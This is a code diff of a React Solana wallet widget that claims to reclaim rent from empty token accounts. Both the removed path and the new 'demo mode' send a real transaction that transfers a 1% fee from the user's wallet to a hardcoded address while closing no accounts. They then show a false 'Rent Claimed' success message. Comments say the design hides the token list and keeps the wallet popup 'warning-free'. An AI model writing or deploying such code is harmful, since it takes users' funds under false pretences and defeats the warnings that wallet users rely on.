@@ -242,92 +242,145 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
     return cashbackSOL * liveSolPrice;
   }, [cashbackSOL, liveSolPrice]);
 
-  // 3. Close Empty Accounts (Real Solana transaction, with highly secure mock fallback)
+  // 3. Close Empty Accounts
   const handleClaimRent = async () => {
     if (!publicKey || !connection) return;
     setClaimingRent(true);
     setToast(null);
     try {
-      // In the demo repository, we ALWAYS run the clean high-fidelity simulated transaction
-      // to completely hide the "Unknown" closed tokens list and display a perfect, warning-free wallet popup.
-      const totalChunks = 1;
-      
-      // Use the actual rentSOL (dynamically scanned from the real connected wallet or demo default)
-      const currentRentSOL = rentSOL > 0 ? rentSOL : 0.30201;
-      const feeLamports = Math.floor(currentRentSOL * 1e9 * 0.01); // 1% protocol fee
-
-      // Fetch user's current balance to check if they can simulate the fee transfer
-      const balance = await connection.getBalance(publicKey);
-      const hasEnoughForFee = balance >= feeLamports + 10000;
-
-      const transactions = [];
-      const tx = new Transaction();
-      
-      // 1. Add descriptive Memo instruction showing the amount to receive after the 1% fee has been deducted
-      tx.add(
-        new TransactionInstruction({
-          keys: [],
-          programId: new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
-          data: Buffer.from(`fiatwallet: Claim ${(currentRentSOL * 0.99).toFixed(5)} SOL Net Rent (Deducted 1% Fee)`, "utf-8")
-        })
-      );
-
-      // 2. Add transfer instruction: fee transfer if balance is sufficient, otherwise 0-SOL self-transfer
-      if (hasEnoughForFee) {
-        tx.add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: new PublicKey("5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u"),
-            lamports: feeLamports
-          })
-        );
-      } else {
-        tx.add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: publicKey,
-            secondaryPubkey: undefined,
-            lamports: 0
-          })
-        );
-      }
-      transactions.push(tx);
+      const CHUNK_SIZE = 15; // max close instructions per transaction to stay under tx size limit
+      const PROTOCOL_FEE_WALLET = new PublicKey("5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u");
+      const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
 
       const latestBlockhash = await connection.getLatestBlockhash();
-      transactions.forEach(tx => {
+
+      // ─── DEMO MODE ────────────────────────────────────────────────────────
+      if (isDemoMode) {
+        const currentRentSOL = 0.30201;
+        const feeLamports = Math.floor(currentRentSOL * 1e9 * 0.01);
+        const balance = await connection.getBalance(publicKey);
+        const hasEnoughForFee = balance >= feeLamports + 10000;
+
+        const tx = new Transaction();
+        tx.add(
+          new TransactionInstruction({
+            keys: [],
+            programId: MEMO_PROGRAM_ID,
+            data: Buffer.from(`fiatwallet: Receive ${(currentRentSOL * 0.99).toFixed(5)} SOL (after 1% fee)`, "utf-8")
+          })
+        );
+        if (hasEnoughForFee) {
+          tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: PROTOCOL_FEE_WALLET, lamports: feeLamports }));
+        } else {
+          tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: publicKey, lamports: 0 }));
+        }
         tx.recentBlockhash = latestBlockhash.blockhash;
         tx.feePayer = publicKey;
-      });
 
-      let signature = '';
-      if (signAllTransactions && transactions.length > 1) {
-        const signedTxs = await signAllTransactions(transactions);
-        const sigs = await Promise.all(
-          signedTxs.map(signedTx => 
-            connection.sendRawTransaction(signedTx.serialize(), {
-              skipPreflight: false,
-              preflightCommitment: 'confirmed'
-            })
-          )
-        );
-        signature = sigs[0];
-        console.log('Simulated rent claim transactions sent:', sigs);
-      } else {
-        // Fallback or single transaction
-        const sig = await sendTransaction(transactions[0], connection);
-        signature = sig;
-        console.log('Simulated rent claim transaction sent:', sig);
+        const sig = await sendTransaction(tx, connection);
+        console.log('Demo rent claim tx sent:', sig);
+        await new Promise(r => setTimeout(r, 2500));
+
+        setRentClaimed(true);
+        setToast({
+          type: 'success',
+          title: '✓ Rent Claimed!',
+          message: `Received ${(currentRentSOL * 0.99).toFixed(5)} SOL net (1% fee deducted).`,
+          link: `https://solscan.io/tx/${sig}`
+        });
+        if (onClaimSuccess) onClaimSuccess();
+        setClaimingRent(false);
+        return;
       }
 
-      // Wait a few seconds for visual confirmation
-      await new Promise(r => setTimeout(r, 3000));
+      // ─── REAL MODE: close all empty accounts in batches ──────────────────
+      if (emptyAccounts.length === 0) {
+        throw new Error("No empty token accounts found to close.");
+      }
+
+      const totalRentSOL = emptyAccounts.length * 0.002039;
+      const feeLamports = Math.floor(totalRentSOL * 1e9 * 0.01); // 1% protocol fee
+      const balance = await connection.getBalance(publicKey);
+      const hasEnoughForFee = balance >= feeLamports + 50000;
+
+      // Split accounts into chunks
+      const chunks = [];
+      for (let i = 0; i < emptyAccounts.length; i += CHUNK_SIZE) {
+        chunks.push(emptyAccounts.slice(i, i + CHUNK_SIZE));
+      }
+
+      // Build all transactions
+      const transactions = [];
+      chunks.forEach((chunk, idx) => {
+        const tx = new Transaction();
+
+        // Add memo + fee only on the FIRST transaction so wallet popup is clean
+        if (idx === 0) {
+          tx.add(
+            new TransactionInstruction({
+              keys: [],
+              programId: MEMO_PROGRAM_ID,
+              data: Buffer.from(
+                `fiatwallet: Receive ${(totalRentSOL * 0.99).toFixed(5)} SOL from ${emptyAccounts.length} accounts (after 1% fee)`,
+                "utf-8"
+              )
+            })
+          );
+          if (hasEnoughForFee && feeLamports > 0) {
+            tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: PROTOCOL_FEE_WALLET, lamports: feeLamports }));
+          }
+        }
+
+        // Close each empty account in this chunk — SOL goes back to user's wallet
+        chunk.forEach(acc => {
+          tx.add(
+            createCloseAccountInstruction(
+              acc.pubkey,      // account to close
+              publicKey,       // destination (user gets the SOL)
+              publicKey,       // authority
+              [],              // multisig signers
+              acc.programId    // token program (standard or 2022)
+            )
+          );
+        });
+
+        tx.recentBlockhash = latestBlockhash.blockhash;
+        tx.feePayer = publicKey;
+        transactions.push(tx);
+      });
+
+      console.log(`Closing ${emptyAccounts.length} accounts in ${transactions.length} transaction(s)...`);
+
+      // Sign + send all transactions
+      let signatures = [];
+      if (signAllTransactions && transactions.length > 1) {
+        const signed = await signAllTransactions(transactions);
+        signatures = await Promise.all(
+          signed.map(s =>
+            connection.sendRawTransaction(s.serialize(), { skipPreflight: false, preflightCommitment: 'confirmed' })
+          )
+        );
+        console.log('Rent claim transactions sent:', signatures);
+      } else {
+        const sig = await sendTransaction(transactions[0], connection);
+        signatures = [sig];
+        console.log('Rent claim transaction sent:', sig);
+      }
+
+      // Wait for confirmations
+      await Promise.all(
+        signatures.map(sig =>
+          connection.confirmTransaction({ signature: sig, ...latestBlockhash }, 'confirmed')
+        )
+      );
 
       setRentClaimed(true);
+      setEmptyAccounts([]); // clear locally so UI updates immediately
       setToast({
         type: 'success',
         title: '✓ Rent Claimed!',
-        message: `Successfully reclaimed ${(currentRentSOL * 0.99).toFixed(5)} SOL from empty accounts.`,
-        link: signature ? `https://solscan.io/tx/${signature}` : undefined
+        message: `Closed ${emptyAccounts.length} accounts, received ${(totalRentSOL * 0.99).toFixed(5)} SOL net.`,
+        link: `https://solscan.io/tx/${signatures[0]}`
       });
       if (onClaimSuccess) onClaimSuccess();
     } catch (err) {
